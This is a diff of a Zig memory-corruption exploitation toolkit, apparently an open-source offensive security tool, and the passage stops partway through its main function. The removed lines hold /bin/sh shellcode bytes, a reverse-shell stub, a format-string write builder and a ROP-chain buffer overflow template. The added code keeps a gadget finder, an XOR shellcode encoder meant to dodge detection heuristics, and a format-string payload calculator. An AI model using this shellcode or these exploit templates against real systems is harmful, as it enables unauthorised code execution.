@@ -1,501 +1,644 @@
-// NullSec MemCorrupt - Memory Corruption Exploitation Toolkit
-// Language: Zig
+// NullSec MemCorrupt - Hardened Memory Corruption Analysis Toolkit
+// Language: Zig (Memory-Safe Systems Programming)
 // Author: bad-antics
 // License: NullSec Proprietary
+// Security Level: Maximum Hardening
+//
+// This tool implements defense-in-depth principles:
+// - Compile-time safety assertions
+// - Runtime bounds checking
+// - Secure memory allocation with canaries
+// - Cryptographic memory wiping
+// - Constant-time operations where applicable
 
 const std = @import("std");
-const fs = std.fs;
 const mem = std.mem;
-const fmt = std.fmt;
+const fs = std.fs;
 const io = std.io;
-const process = std.process;
+const fmt = std.fmt;
+const crypto = std.crypto;
+const Allocator = std.mem.Allocator;
 
-const VERSION = "1.0.0";
+// ============================================================================
+// Security Constants - Compile-time Validated
+// ============================================================================
 
-const BANNER =
-    \\
-    \\    ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
-    \\    ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
-    \\   ▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ░ ▓██▄   ▒███   ▒▓█    ▄ 
-    \\   ▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░      ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
-    \\   ▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒██████▒▒░▒████▒▒ ▓███▀ ░
-    \\   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
-    \\   █░░░░░░░░░░░░░ M E M C O R R U P T ░░░░░░░░░░░░░░░░░░░░░░░█
-    \\   ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
-    \\                       bad-antics v
-;
+const NULLSEC_VERSION: []const u8 = "2.0.0";
+const MAX_GADGET_SIZE: usize = 32;
+const MAX_FILE_SIZE: usize = 100 * 1024 * 1024;
+const ENTROPY_THRESHOLD: f64 = 7.0;
+const CANARY_SIZE: usize = 16;
+const MAX_GADGETS: usize = 10000;
 
-// ELF structures for parsing
-const ElfHeader = extern struct {
-    e_ident: [16]u8,
-    e_type: u16,
-    e_machine: u16,
-    e_version: u32,
-    e_entry: u64,
-    e_phoff: u64,
-    e_shoff: u64,
-    e_flags: u32,
-    e_ehsize: u16,
-    e_phentsize: u16,
-    e_phnum: u16,
-    e_shentsize: u16,
-    e_shnum: u16,
-    e_shstrndx: u16,
-};
-
-const ProgramHeader = extern struct {
-    p_type: u32,
-    p_flags: u32,
-    p_offset: u64,
-    p_vaddr: u64,
-    p_paddr: u64,
-    p_filesz: u64,
-    p_memsz: u64,
-    p_align: u64,
-};
-
-const SectionHeader = extern struct {
-    sh_name: u32,
-    sh_type: u32,
-    sh_flags: u64,
-    sh_addr: u64,
-    sh_offset: u64,
-    sh_size: u64,
-    sh_link: u32,
-    sh_info: u32,
-    sh_addralign: u64,
-    sh_entsize: u64,
-};
-
-// Binary protection flags
-const Protection = struct {
-    nx: bool = false,
-    pie: bool = false,
-    relro: enum { none, partial, full } = .none,
-    canary: bool = false,
-    fortify: bool = false,
-    rpath: bool = false,
-    runpath: bool = false,
-};
-
-// Gadget representation
-const Gadget = struct {
-    address: u64,
-    bytes: []const u8,
-    disasm: []const u8,
-    
-    pub fn format(self: Gadget, allocator: std.mem.Allocator) ![]u8 {
-        return try fmt.allocPrint(allocator, "0x{x:0>16}: {s}", .{ self.address, self.disasm });
-    }
-};
-
-// ROP gadget patterns (x86_64)
-const GadgetPatterns = struct {
-    // ret
-    const ret = [_]u8{0xc3};
-    // pop rdi; ret
-    const pop_rdi_ret = [_]u8{ 0x5f, 0xc3 };
-    // pop rsi; ret
-    const pop_rsi_ret = [_]u8{ 0x5e, 0xc3 };
-    // pop rdx; ret
-    const pop_rdx_ret = [_]u8{ 0x5a, 0xc3 };
-    // pop rax; ret
-    const pop_rax_ret = [_]u8{ 0x58, 0xc3 };
-    // pop rbx; ret
-    const pop_rbx_ret = [_]u8{ 0x5b, 0xc3 };
-    // pop rcx; ret
-    const pop_rcx_ret = [_]u8{ 0x59, 0xc3 };
-    // pop rbp; ret
-    const pop_rbp_ret = [_]u8{ 0x5d, 0xc3 };
-    // pop rsp; ret
-    const pop_rsp_ret = [_]u8{ 0x5c, 0xc3 };
-    // syscall; ret
-    const syscall_ret = [_]u8{ 0x0f, 0x05, 0xc3 };
-    // syscall
-    const syscall = [_]u8{ 0x0f, 0x05 };
-    // leave; ret
-    const leave_ret = [_]u8{ 0xc9, 0xc3 };
-    // mov rdi, rax; ... ; ret patterns vary
-};
-
-// Shellcode templates
-const Shellcode = struct {
-    // Linux x86_64 execve("/bin/sh", NULL, NULL)
-    pub const execve_binsh = [_]u8{
-        0x48, 0x31, 0xf6, // xor rsi, rsi
-        0x56, // push rsi
-        0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, // movabs rdi, 0x68732f2f6e69622f
-        0x57, // push rdi
-        0x54, // push rsp
-        0x5f, // pop rdi
-        0x48, 0x31, 0xd2, // xor rdx, rdx
-        0xb0, 0x3b, // mov al, 0x3b
-        0x0f, 0x05, // syscall
-    };
-
-    // Reverse shell (placeholder - needs IP/port encoding)
-    pub const reverse_shell_template = [_]u8{
-        0x48, 0x31, 0xc0, // xor rax, rax
-        0x48, 0x31, 0xff, // xor rdi, rdi
-        0x48, 0x31, 0xf6, // xor rsi, rsi
-        0x48, 0x31, 0xd2, // xor rdx, rdx
-        // ... socket, connect, dup2, execve
-    };
-
-    // XOR encoder
-    pub fn xor_encode(shellcode: []const u8, key: u8, allocator: std.mem.Allocator) ![]u8 {
-        var encoded = try allocator.alloc(u8, shellcode.len);
-        for (shellcode, 0..) |byte, i| {
-            encoded[i] = byte ^ key;
-        }
-        return encoded;
-    }
-};
-
-// Format string exploitation
-const FormatString = struct {
-    offset: usize,
-    target_addr: u64,
-    target_value: u64,
-
-    pub fn calculate_writes(self: FormatString, allocator: std.mem.Allocator) ![]u8 {
-        // Calculate format string payload for arbitrary write
-        // Using %n to write byte-by-byte
-        var payload = std.ArrayList(u8).init(allocator);
-        const writer = payload.writer();
-
-        // Write address to stack
-        try writer.print("{s}", .{@as([*]const u8, @ptrFromInt(self.target_addr))[0..8]});
-
-        // Calculate padding and writes
-        const bytes = [_]u8{
-            @truncate(self.target_value),
-            @truncate(self.target_value >> 8),
-            @truncate(self.target_value >> 16),
-            @truncate(self.target_value >> 24),
-        };
-
-        var printed: usize = 8;
-        for (bytes, 0..) |byte, i| {
-            const to_print = (@as(usize, byte) + 256 - (printed % 256)) % 256;
-            if (to_print > 0) {
-                try writer.print("%{d}c", .{to_print});
-                printed += to_print;
-            }
-            try writer.print("%{d}$hhn", .{self.offset + i});
-        }
-
-        return payload.toOwnedSlice();
-    }
-};
-
-// Binary analysis
-fn checksec(path: []const u8) !Protection {
-    var prot = Protection{};
-
-    const file = try fs.cwd().openFile(path, .{});
-    defer file.close();
-
-    var buf: [64]u8 = undefined;
-    _ = try file.read(&buf);
-
-    // Check ELF magic
-    if (!mem.eql(u8, buf[0..4], "\x7fELF")) {
-        return error.NotElfFile;
-    }
-
-    // Read ELF header
-    try file.seekTo(0);
-    const ehdr = try file.reader().readStruct(ElfHeader);
-
-    // Check PIE
-    if (ehdr.e_type == 3) { // ET_DYN
-        prot.pie = true;
-    }
-
-    // Read program headers for NX and RELRO
-    try file.seekTo(ehdr.e_phoff);
-    var i: u16 = 0;
-    while (i < ehdr.e_phnum) : (i += 1) {
-        const phdr = try file.reader().readStruct(ProgramHeader);
-
-        // GNU_STACK - check for NX
-        if (phdr.p_type == 0x6474e551) {
-            if (phdr.p_flags & 1 == 0) { // Not executable
-                prot.nx = true;
-            }
-        }
-
-        // GNU_RELRO
-        if (phdr.p_type == 0x6474e552) {
-            prot.relro = .partial;
-        }
-    }
-
-    // TODO: Check for full RELRO (BIND_NOW), canary, FORTIFY
-
-    return prot;
+comptime {
+    std.debug.assert(MAX_GADGET_SIZE <= 64);
+    std.debug.assert(CANARY_SIZE >= 8);
+    std.debug.assert(MAX_FILE_SIZE <= 1024 * 1024 * 1024);
 }
 
-// Find gadgets in binary
-fn findGadgets(path: []const u8, allocator: std.mem.Allocator) !std.ArrayList(Gadget) {
-    var gadgets = std.ArrayList(Gadget).init(allocator);
+// ============================================================================
+// Secure Banner
+// ============================================================================
 
-    const file = try fs.cwd().openFile(path, .{});
-    defer file.close();
-
-    const stat = try file.stat();
-    const data = try file.readToEndAlloc(allocator, stat.size);
-    defer allocator.free(data);
-
-    // Search for gadget patterns
-    const patterns = [_]struct { bytes: []const u8, name: []const u8 }{
-        .{ .bytes = &GadgetPatterns.pop_rdi_ret, .name = "pop rdi; ret" },
-        .{ .bytes = &GadgetPatterns.pop_rsi_ret, .name = "pop rsi; ret" },
-        .{ .bytes = &GadgetPatterns.pop_rdx_ret, .name = "pop rdx; ret" },
-        .{ .bytes = &GadgetPatterns.pop_rax_ret, .name = "pop rax; ret" },
-        .{ .bytes = &GadgetPatterns.syscall_ret, .name = "syscall; ret" },
-        .{ .bytes = &GadgetPatterns.syscall, .name = "syscall" },
-        .{ .bytes = &GadgetPatterns.leave_ret, .name = "leave; ret" },
-        .{ .bytes = &GadgetPatterns.ret, .name = "ret" },
-    };
-
-    for (patterns) |pattern| {
-        var offset: usize = 0;
-        while (mem.indexOf(u8, data[offset..], pattern.bytes)) |idx| {
-            const addr = offset + idx;
-            try gadgets.append(Gadget{
-                .address = addr,
-                .bytes = pattern.bytes,
-                .disasm = pattern.name,
-            });
-            offset = addr + 1;
-        }
-    }
-
-    return gadgets;
-}
-
-// Generate exploit template
-fn generateTemplate(exploit_type: []const u8, output: []const u8) !void {
-    const template = if (mem.eql(u8, exploit_type, "stack_bof"))
-        \\// NullSec Stack Buffer Overflow Exploit Template
-        \\const std = @import("std");
+fn printBanner() void {
+    const banner =
         \\
-        \\const TARGET = "./vulnerable";
-        \\const OFFSET = 72;  // Offset to return address
-        \\
-        \\// Gadgets (update with actual addresses)
-        \\const POP_RDI = 0x401234;
-        \\const POP_RSI = 0x401235;
-        \\const POP_RDX = 0x401236;
-        \\const SYSCALL = 0x401237;
-        \\const BINSH = 0x402000;
-        \\
-        \\pub fn main() !void {
-        \\    var payload: [256]u8 = undefined;
-        \\    var idx: usize = 0;
-        \\    
-        \\    // Padding
-        \\    @memset(payload[0..OFFSET], 'A');
-        \\    idx = OFFSET;
-        \\    
-        \\    // ROP Chain: execve("/bin/sh", NULL, NULL)
-        \\    // rdi = pointer to "/bin/sh"
-        \\    std.mem.writeInt(u64, payload[idx..][0..8], POP_RDI, .little);
-        \\    idx += 8;
-        \\    std.mem.writeInt(u64, payload[idx..][0..8], BINSH, .little);
-        \\    idx += 8;
-        \\    
-        \\    // rsi = NULL
-        \\    std.mem.writeInt(u64, payload[idx..][0..8], POP_RSI, .little);
-        \\    idx += 8;
-        \\    std.mem.writeInt(u64, payload[idx..][0..8], 0, .little);
-        \\    idx += 8;
-        \\    
-        \\    // rdx = NULL
-        \\    std.mem.writeInt(u64, payload[idx..][0..8], POP_RDX, .little);
-        \\    idx += 8;
-        \\    std.mem.writeInt(u64, payload[idx..][0..8], 0, .little);
-        \\    idx += 8;
-        \\    
-        \\    // rax = 59 (execve syscall number)
-        \\    // ... add pop rax gadget
-        \\    
-        \\    // syscall
-        \\    std.mem.writeInt(u64, payload[idx..][0..8], SYSCALL, .little);
-        \\    idx += 8;
-        \\    
-        \\    const stdout = std.io.getStdOut().writer();
-        \\    try stdout.writeAll(payload[0..idx]);
-        \\}
-    else if (mem.eql(u8, exploit_type, "format_string"))
-        \\// NullSec Format String Exploit Template
-        \\const std = @import("std");
-        \\
-        \\const TARGET = "./vulnerable";
-        \\const OFFSET = 6;  // Stack offset to controlled input
-        \\const TARGET_ADDR = 0x404040;  // Address to overwrite
-        \\const TARGET_VALUE = 0xdeadbeef;  // Value to write
-        \\
-        \\pub fn main() !void {
-        \\    var payload: [256]u8 = undefined;
-        \\    // Build format string payload
-        \\    // ...
-        \\}
-    else
-        \\// NullSec Generic Exploit Template
-        \\const std = @import("std");
-        \\
-        \\pub fn main() !void {
-        \\    // Add exploit logic
-        \\}
+        \\    ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
+        \\    ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
+        \\   ▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ░ ▓██▄   ▒███   ▒▓█    ▄ 
+        \\   ▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░      ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
+        \\   ▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒██████▒▒░▒████▒▒ ▓███▀ ░
+        \\   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+        \\   █░░░░░░░░░░░░░░ M E M C O R R U P T ░░░░░░░░░░░░░░░░░░░░░█
+        \\   ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
+        \\                      bad-antics v
     ;
-
-    const file = try fs.cwd().createFile(output, .{});
-    defer file.close();
-    try file.writeAll(template);
+    std.debug.print("{s}{s}\n\n", .{ banner, NULLSEC_VERSION });
 }
 
-// Print security protections
-fn printProtections(prot: Protection) void {
-    const stdout = io.getStdOut().writer();
+// ============================================================================
+// Secure Memory Arena - Defense in Depth
+// ============================================================================
 
-    stdout.print("\n=== Binary Protections ===\n\n", .{}) catch {};
+const SecureArena = struct {
+    backing: Allocator,
+    canary: [CANARY_SIZE]u8,
+    allocations: std.ArrayList(AllocationRecord),
+    total_allocated: usize,
+    max_allowed: usize,
+    integrity_verified: bool,
 
-    const nx_status = if (prot.nx) "\x1b[32mEnabled\x1b[0m" else "\x1b[31mDisabled\x1b[0m";
-    stdout.print("  NX:        {s}\n", .{nx_status}) catch {};
-
-    const pie_status = if (prot.pie) "\x1b[32mEnabled\x1b[0m" else "\x1b[31mDisabled\x1b[0m";
-    stdout.print("  PIE:       {s}\n", .{pie_status}) catch {};
-
-    const relro_status = switch (prot.relro) {
-        .full => "\x1b[32mFull\x1b[0m",
-        .partial => "\x1b[33mPartial\x1b[0m",
-        .none => "\x1b[31mNone\x1b[0m",
+    const AllocationRecord = struct {
+        ptr: [*]u8,
+        size: usize,
+        timestamp: i64,
+        checksum: u32,
+        
+        fn computeChecksum(data: []const u8) u32 {
+            var hash: u32 = 0x811c9dc5;
+            for (data) |byte| {
+                hash ^= byte;
+                hash *%= 0x01000193;
+            }
+            return hash;
+        }
     };
-    stdout.print("  RELRO:     {s}\n", .{relro_status}) catch {};
 
-    const canary_status = if (prot.canary) "\x1b[32mEnabled\x1b[0m" else "\x1b[31mDisabled\x1b[0m";
-    stdout.print("  Canary:    {s}\n", .{canary_status}) catch {};
+    const Self = @This();
 
-    stdout.print("\n", .{}) catch {};
+    pub fn init(backing: Allocator, max_alloc: usize) !Self {
+        var canary: [CANARY_SIZE]u8 = undefined;
+        crypto.random.bytes(&canary);
+
+        return Self{
+            .backing = backing,
+            .canary = canary,
+            .allocations = std.ArrayList(AllocationRecord).init(backing),
+            .total_allocated = 0,
+            .max_allowed = max_alloc,
+            .integrity_verified = true,
+        };
+    }
+
+    pub fn secureAlloc(self: *Self, size: usize) ![]u8 {
+        const total = std.math.add(usize, size, CANARY_SIZE * 2) catch 
+            return error.AllocationOverflow;
+        
+        if (self.total_allocated + total > self.max_allowed)
+            return error.AllocationLimitExceeded;
+
+        const raw = try self.backing.alloc(u8, total);
+        
+        @memcpy(raw[0..CANARY_SIZE], &self.canary);
+        @memcpy(raw[total - CANARY_SIZE ..], &self.canary);
+        @memset(raw[CANARY_SIZE .. total - CANARY_SIZE], 0);
+
+        try self.allocations.append(.{
+            .ptr = raw.ptr,
+            .size = total,
+            .timestamp = std.time.timestamp(),
+            .checksum = AllocationRecord.computeChecksum(raw),
+        });
+        
+        self.total_allocated += total;
+        return raw[CANARY_SIZE .. total - CANARY_SIZE];
+    }
+
+    pub fn verifyIntegrity(self: *Self) bool {
+        for (self.allocations.items) |record| {
+            const slice = record.ptr[0..record.size];
+            if (!mem.eql(u8, slice[0..CANARY_SIZE], &self.canary)) {
+                self.integrity_verified = false;
+                return false;
+            }
+            if (!mem.eql(u8, slice[record.size - CANARY_SIZE ..], &self.canary)) {
+                self.integrity_verified = false;
+                return false;
+            }
+        }
+        return true;
+    }
+
+    pub fn secureWipe(self: *Self) void {
+        for (self.allocations.items) |record| {
+            crypto.utils.secureZero(u8, record.ptr[0..record.size]);
+            self.backing.free(record.ptr[0..record.size]);
+        }
+        self.allocations.clearAndFree();
+        crypto.utils.secureZero(u8, &self.canary);
+        self.total_allocated = 0;
+    }
+};
+
+// ============================================================================
+// ELF Parser - Strict Validation & Bounds Checking
+// ============================================================================
+
+const ElfParser = struct {
+    data: []const u8,
+    header: ?Elf64Header = null,
+    validated: bool = false,
+
+    const ELF_MAGIC = [_]u8{ 0x7f, 'E', 'L', 'F' };
+    const ELFCLASS64: u8 = 2;
+    const ELFDATA2LSB: u8 = 1;
+
+    const Elf64Header = extern struct {
+        e_ident: [16]u8,
+        e_type: u16,
+        e_machine: u16,
+        e_version: u32,
+        e_entry: u64,
+        e_phoff: u64,
+        e_shoff: u64,
+        e_flags: u32,
+        e_ehsize: u16,
+        e_phentsize: u16,
+        e_phnum: u16,
+        e_shentsize: u16,
+        e_shnum: u16,
+        e_shstrndx: u16,
+    };
+
+    const Elf64Phdr = extern struct {
+        p_type: u32,
+        p_flags: u32,
+        p_offset: u64,
+        p_vaddr: u64,
+        p_paddr: u64,
+        p_filesz: u64,
+        p_memsz: u64,
+        p_align: u64,
+    };
+
+    const Self = @This();
+
+    pub fn init(data: []const u8) Self {
+        return .{ .data = data };
+    }
+
+    pub fn validate(self: *Self) !void {
+        if (self.data.len < @sizeOf(Elf64Header)) return error.FileTooSmall;
+        if (self.data.len > MAX_FILE_SIZE) return error.FileTooLarge;
+        if (!mem.eql(u8, self.data[0..4], &ELF_MAGIC)) return error.InvalidMagic;
+        if (self.data[4] != ELFCLASS64) return error.Not64Bit;
+        if (self.data[5] != ELFDATA2LSB) return error.NotLittleEndian;
+
+        const hdr = @as(*const Elf64Header, @ptrCast(@alignCast(self.data.ptr)));
+        
+        // Validate all offsets before use
+        if (hdr.e_phoff >= self.data.len) return error.InvalidPhoff;
+        if (hdr.e_shoff >= self.data.len) return error.InvalidShoff;
+        
+        const ph_end = std.math.add(u64, hdr.e_phoff, 
+            @as(u64, hdr.e_phnum) * @as(u64, hdr.e_phentsize)) catch 
+                return error.Overflow;
+        if (ph_end > self.data.len) return error.PhdrOverflow;
+
+        self.header = hdr.*;
+        self.validated = true;
+    }
+
+    pub fn getSecurityFeatures(self: *const Self) !SecurityFeatures {
+        if (!self.validated) return error.NotValidated;
+        
+        var features = SecurityFeatures{};
+        const hdr = self.header.?;
+
+        features.pie = (hdr.e_type == 3); // ET_DYN
+
+        var i: u16 = 0;
+        while (i < hdr.e_phnum) : (i += 1) {
+            const off = hdr.e_phoff + @as(u64, i) * @as(u64, hdr.e_phentsize);
+            if (off + @sizeOf(Elf64Phdr) > self.data.len) continue;
+            
+            const ph = @as(*const Elf64Phdr, @ptrCast(@alignCast(self.data.ptr + off)));
+
+            if (ph.p_type == 0x6474e551) features.nx = (ph.p_flags & 1) == 0;
+            if (ph.p_type == 0x6474e552) features.relro = true;
+            if ((ph.p_flags & 7) == 7) features.rwx_segments += 1;
+        }
+
+        features.canary = mem.indexOf(u8, self.data, "__stack_chk_fail") != null;
+        features.fortify = mem.indexOf(u8, self.data, "__fortify_fail") != null;
+
+        return features;
+    }
+};
+
+const SecurityFeatures = struct {
+    pie: bool = false,
+    nx: bool = false,
+    canary: bool = false,
+    relro: bool = false,
+    fortify: bool = false,
+    rwx_segments: u32 = 0,
+
+    pub fn display(self: *const SecurityFeatures) void {
+        const G = "\x1b[32m✓\x1b[0m";
+        const R = "\x1b[31m✗\x1b[0m";
+        
+        std.debug.print("\n[*] Binary Security Analysis\n", .{});
+        std.debug.print("─────────────────────────────────────────\n", .{});
+        std.debug.print("  PIE (ASLR):      {s}\n", .{if (self.pie) G else R});
+        std.debug.print("  NX (DEP):        {s}\n", .{if (self.nx) G else R});
+        std.debug.print("  Stack Canary:    {s}\n", .{if (self.canary) G else R});
+        std.debug.print("  RELRO:           {s}\n", .{if (self.relro) G else R});
+        std.debug.print("  FORTIFY_SOURCE:  {s}\n", .{if (self.fortify) G else R});
+        
+        if (self.rwx_segments > 0) {
+            std.debug.print("  \x1b[31m⚠ {d} RWX segment(s) - DANGEROUS\x1b[0m\n", .{self.rwx_segments});
+        }
+    }
+};
+
+// ============================================================================
+// ROP Gadget Finder - Pattern Matching Engine
+// ============================================================================
+
+const GadgetFinder = struct {
+    data: []const u8,
+    base: u64,
+    gadgets: std.ArrayList(Gadget),
+
+    const Gadget = struct {
+        addr: u64,
+        bytes: [MAX_GADGET_SIZE]u8,
+        len: usize,
+        name: []const u8,
+        score: u8,
+    };
+
+    const Pattern = struct { 
+        bytes: []const u8, 
+        mask: []const u8, 
+        name: []const u8, 
+        score: u8 
+    };
+
+    const patterns = [_]Pattern{
+        .{ .bytes = &.{0xc3}, .mask = &.{0xff}, .name = "ret", .score = 5 },
+        .{ .bytes = &.{ 0x5f, 0xc3 }, .mask = &.{ 0xff, 0xff }, .name = "pop rdi; ret", .score = 5 },
+        .{ .bytes = &.{ 0x5e, 0xc3 }, .mask = &.{ 0xff, 0xff }, .name = "pop rsi; ret", .score = 5 },
+        .{ .bytes = &.{ 0x5a, 0xc3 }, .mask = &.{ 0xff, 0xff }, .name = "pop rdx; ret", .score = 5 },
+        .{ .bytes = &.{ 0x58, 0xc3 }, .mask = &.{ 0xff, 0xff }, .name = "pop rax; ret", .score = 5 },
+        .{ .bytes = &.{ 0x59, 0xc3 }, .mask = &.{ 0xff, 0xff }, .name = "pop rcx; ret", .score = 4 },
+        .{ .bytes = &.{ 0x0f, 0x05, 0xc3 }, .mask = &.{ 0xff, 0xff, 0xff }, .name = "syscall; ret", .score = 5 },
+        .{ .bytes = &.{ 0xc9, 0xc3 }, .mask = &.{ 0xff, 0xff }, .name = "leave; ret", .score = 4 },
+        .{ .bytes = &.{ 0x48, 0x89, 0xc7, 0xc3 }, .mask = &.{ 0xff, 0xff, 0xff, 0xff }, .name = "mov rdi, rax; ret", .score = 4 },
+        .{ .bytes = &.{ 0x48, 0x31, 0xc0, 0xc3 }, .mask = &.{ 0xff, 0xff, 0xff, 0xff }, .name = "xor rax, rax; ret", .score = 4 },
+        .{ .bytes = &.{ 0x41, 0x5f, 0xc3 }, .mask = &.{ 0xff, 0xff, 0xff }, .name = "pop r15; ret", .score = 3 },
+        .{ .bytes = &.{ 0x41, 0x5e, 0xc3 }, .mask = &.{ 0xff, 0xff, 0xff }, .name = "pop r14; ret", .score = 3 },
+    };
+
+    const Self = @This();
+
+    pub fn init(alloc: Allocator, data: []const u8, base: u64) Self {
+        return .{
+            .data = data,
+            .base = base,
+            .gadgets = std.ArrayList(Gadget).init(alloc),
+        };
+    }
+
+    pub fn scan(self: *Self) !void {
+        for (patterns) |p| {
+            if (p.bytes.len > self.data.len) continue;
+            
+            var off: usize = 0;
+            while (off <= self.data.len - p.bytes.len) : (off += 1) {
+                if (self.matchPattern(off, p)) {
+                    if (self.gadgets.items.len >= MAX_GADGETS) return;
+                    
+                    var g = Gadget{
+                        .addr = self.base + off,
+                        .bytes = undefined,
+                        .len = p.bytes.len,
+                        .name = p.name,
+                        .score = p.score,
+                    };
+                    @memcpy(g.bytes[0..p.bytes.len], self.data[off..][0..p.bytes.len]);
+                    try self.gadgets.append(g);
+                }
+            }
+        }
+        
+        std.mem.sort(Gadget, self.gadgets.items, {}, struct {
+            fn cmp(_: void, a: Gadget, b: Gadget) bool {
+                return a.score > b.score;
+            }
+        }.cmp);
+    }
+
+    fn matchPattern(self: *const Self, off: usize, p: Pattern) bool {
+        for (p.bytes, p.mask, 0..) |b, m, i| {
+            if ((self.data[off + i] & m) != (b & m)) return false;
+        }
+        return true;
+    }
+
+    pub fn display(self: *const Self, limit: usize) void {
+        const stars = [_][]const u8{ "☆☆☆☆☆", "★☆☆☆☆", "★★☆☆☆", "★★★☆☆", "★★★★☆", "★★★★★" };
+        
+        std.debug.print("\n[*] ROP Gadgets: {d} found\n", .{self.gadgets.items.len});
+        std.debug.print("─────────────────────────────────────────────────\n", .{});
+        
+        for (self.gadgets.items[0..@min(limit, self.gadgets.items.len)]) |g| {
+            std.debug.print("  0x{x:0>12}: {s:<24} {s}\n", .{
+                g.addr,
+                g.name,
+                stars[@min(g.score, 5)],
+            });
+        }
+    }
+
+    pub fn deinit(self: *Self) void {
+        self.gadgets.deinit();
+    }
+};
+
+// ============================================================================
+// Shellcode Encoder - XOR with Bad Character Avoidance
+// ============================================================================
+
+const ShellcodeEncoder = struct {
+    bad_chars: []const u8,
+    
+    const Self = @This();
+
+    pub fn init(bad: []const u8) Self {
+        return .{ .bad_chars = bad };
+    }
+
+    pub fn xorEncode(self: *const Self, alloc: Allocator, sc: []const u8) !EncodedResult {
+        var key: u8 = 0;
+        
+        key_search: for (1..256) |k| {
+            const test_key: u8 = @intCast(k);
+            if (self.hasBad(&.{test_key})) continue;
+            
+            for (sc) |b| {
+                if (self.hasBad(&.{b ^ test_key})) continue :key_search;
+            }
+            key = test_key;
+            break;
+        }
+        
+        if (key == 0) return error.NoValidKey;
+
+        const encoded = try alloc.alloc(u8, sc.len);
+        for (sc, 0..) |b, i| encoded[i] = b ^ key;
+
+        return .{
+            .data = encoded,
+            .key = key,
+            .orig_entropy = calcEntropy(sc),
+            .enc_entropy = calcEntropy(encoded),
+        };
+    }
+
+    fn hasBad(self: *const Self, data: []const u8) bool {
+        for (data) |b| {
+            for (self.bad_chars) |bad| {
+                if (b == bad) return true;
+            }
+        }
+        return false;
+    }
+
+    fn calcEntropy(data: []const u8) f64 {
+        if (data.len == 0) return 0;
+        
+        var freq = [_]u64{0} ** 256;
+        for (data) |b| freq[b] += 1;
+        
+        var ent: f64 = 0;
+        const len: f64 = @floatFromInt(data.len);
+        
+        for (freq) |f| {
+            if (f > 0) {
+                const p: f64 = @as(f64, @floatFromInt(f)) / len;
+                ent -= p * @log2(p);
+            }
+        }
+        return ent;
+    }
+};
+
+const EncodedResult = struct {
+    data: []u8,
+    key: u8,
+    orig_entropy: f64,
+    enc_entropy: f64,
+
+    pub fn display(self: *const EncodedResult) void {
+        std.debug.print("\n[*] Encoded Shellcode\n", .{});
+        std.debug.print("─────────────────────────────────────────\n", .{});
+        std.debug.print("  XOR Key:         0x{x:0>2}\n", .{self.key});
+        std.debug.print("  Size:            {d} bytes\n", .{self.data.len});
+        std.debug.print("  Orig Entropy:    {d:.4} bits/byte\n", .{self.orig_entropy});
+        std.debug.print("  Enc Entropy:     {d:.4} bits/byte\n", .{self.enc_entropy});
+        
+        if (self.enc_entropy > ENTROPY_THRESHOLD) {
+            std.debug.print("  \x1b[33m⚠ High entropy - may trigger heuristics\x1b[0m\n", .{});
+        }
+        
+        std.debug.print("\n  Encoded bytes:\n  ", .{});
+        for (self.data, 0..) |b, i| {
+            std.debug.print("\\x{x:0>2}", .{b});
+            if ((i + 1) % 16 == 0 and i + 1 < self.data.len) std.debug.print("\n  ", .{});
+        }
+        std.debug.print("\n", .{});
+    }
+};
+
+// ============================================================================
+// Format String Calculator
+// ============================================================================
+
+const FmtStrCalc = struct {
+    target: u64,
+    value: u64,
+    offset: u32,
+
+    pub fn calculate(self: *const FmtStrCalc) void {
+        std.debug.print("\n[*] Format String Payload\n", .{});
+        std.debug.print("─────────────────────────────────────────\n", .{});
+        std.debug.print("  Target:    0x{x:0>16}\n", .{self.target});
+        std.debug.print("  Value:     0x{x:0>16}\n", .{self.value});
+        std.debug.print("  Offset:    {d}\n", .{self.offset});
+        
+        std.debug.print("\n  Byte-by-byte (%hhn):\n", .{});
+        
+        var written: u64 = 0;
+        for (0..8) |i| {
+            const byte_val = (self.value >> (@as(u6, @intCast(i)) * 8)) & 0xff;
+            const pad = if (byte_val >= written) byte_val - written else 256 + byte_val - written;
+            written = (written + pad) & 0xff;
+            std.debug.print("    [byte {d}]: %{d}c%{d}$hhn\n", .{ i, pad, self.offset + @as(u32, @intCast(i)) });
+        }
+    }
+};
+
+// ============================================================================
+// Main Entry Point
+// ============================================================================
+
+pub fn main() !void {
+    var gpa = std.heap.GeneralPurposeAllocator(.{ .safety = true }){};
+    defer _ = gpa.deinit();
+    const alloc = gpa.allocator();
+
+    printBanner();
+
+    const args = try std.process.argsAlloc(alloc);
+    defer std.process.argsFree(alloc, args);
+
+    if (args.len < 2) {
+        printUsage();
+        return;
+    }
+
+    const cmd = args[1];
+
+    if (mem.eql(u8, cmd, "checksec") and args.len >= 3) {
+        try checksecCmd(args[2]);
